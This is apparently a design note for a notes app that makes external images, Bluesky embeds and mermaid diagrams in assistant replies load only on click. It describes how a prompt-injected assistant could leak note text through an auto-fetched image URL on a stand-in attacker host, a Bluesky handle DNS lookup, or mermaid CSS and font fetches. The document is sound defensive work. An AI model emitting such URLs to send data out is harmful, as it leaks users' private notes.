# External media load on click (pkm-tk9i)

## Why

The security review's one High finding: an assistant reply containing
`![x](https://attacker.invalid/?q=<note text>)` makes the browser fetch that
URL as soon as it scrolls near the viewport. An injected model can leak note
text that way with no click and no write approval. A bare Bluesky post URL
in a reply does the same through the handle lookup: Bluesky's servers
resolve `<secret>.attacker.example`, and the attacker's DNS sees the secret.

## Decided (Arthur, 2026-10-23)

| Where | External image | Bluesky embed |
|---|---|---|
| Notes | placeholder, loads on click | renders as today |
| Assistant replies (incl. `((refs))` resolved inside them) | placeholder, loads on click | placeholder, loads on click |

The 43 external images that were in the notes have been downloaded and
re-uploaded as assets, so no note shows a placeholder today. The rule
guards future pastes and text the assistant writes.

## Approaches

1. **One choke point per medium plus a context flag (chosen).**
   `AssetImage` treats any `src` not under `/assets/` as external and renders
   a placeholder (alt text and host); a click swaps in the `<img>` for that
   one image. A new `UntrustedContentContext` (beside `InertMediaContext` in
   `contexts.ts`), provided by `AssistantPanel` around reply rendering, makes
   `BlueskyEmbed` render a placeholder that loads the embed on click. Every
   render path (blocks, tables, popovers, block refs inside replies) goes
   through these components, so nothing else changes.
2. Rewrite external images to links in the tokenizer. Drops the in-place
   image; rejected.
3. A Content-Security-Policy `img-src 'self'`. A browser guarantee, but it
   blocks the image after the click too, and would need a proxy; rejected
   for now (pkm-e95y may revisit CSP as hardening).

## Behaviour details

- Placeholder text: `image from <host>: <alt>` (alt omitted when empty), as
  a button; keyboard-activatable. Host is `URL(src).host`; an unparsable src
  shows `external image`.
- A click loads only that image; nothing is remembered across renders or
  reloads, and no allow-list exists.
- `data:` and `blob:` URLs are not external fetches, but `data:` images in
  notes are rare and an attacker gains nothing from them; treat anything not
  under `/assets/` as external to keep one rule (builder's call to revisit
  if this hides a real use).
- Inside `InertMediaContext` (popover rows whose whole row is the click
  target) the placeholder is inert text, not a button.
- The uploaded-asset path (`/assets/...`) is unchanged: it loads as today and
  expands fullscreen.

## Tests

- Red first, rebuilt from the review's reproduction: a Playwright spec with
  request interception renders an assistant reply holding an external image
  and a bare Bluesky URL and asserts no request leaves for either host; then
  clicking the image placeholder issues exactly that one request.
- A note page with an external image: no request until clicked. A note with
  a bare Bluesky URL still embeds (request to embed.bsky.app happens).
- Vitest beside `AssetImage` and `BlueskyEmbed` for the placeholder states.

## Left to the builder

Placeholder styling (reuse `.asset-image-placeholder`), exact wording of the
Bluesky placeholder, and where the context provider sits in
`AssistantPanel`.

## Added after the adversarial review (controller ruling, 2026-10-23)

The adversarial review found mermaid to be the same channel: stock mermaid's
strict mode fetched `<img src>` in labels, frontmatter `themeCSS` `url()` and
image shapes on render, from a reply or a note, and every beautiful-mermaid
diagram imported Google Fonts. The Decided table gains a mermaid column:

| Where | Diagram beautiful-mermaid renders | Diagram needing the stock fallback |
|---|---|---|
| Notes | renders as today | renders as today, with the hardened config |
| Assistant replies | renders directly | source plus a `Render diagram` button; the click runs the hardened stock render |

No diagram anywhere fetches an external URL. beautiful-mermaid's `@import`
rules are stripped. Stock mermaid secures its CSS-bearing config keys,
forbids the label tags and attributes that load a URL, and refuses source
those cannot stop (image shapes, actor icons, CSS fetch functions and the
escapes that spell them); a refused diagram shows its source.

The same review's same-origin finding also lands here: an `/assets/` src
whose path climbs out of `/assets/` (`..`, `%2e%2e`, a backslash, an encoded
slash) is external and waits for a click.
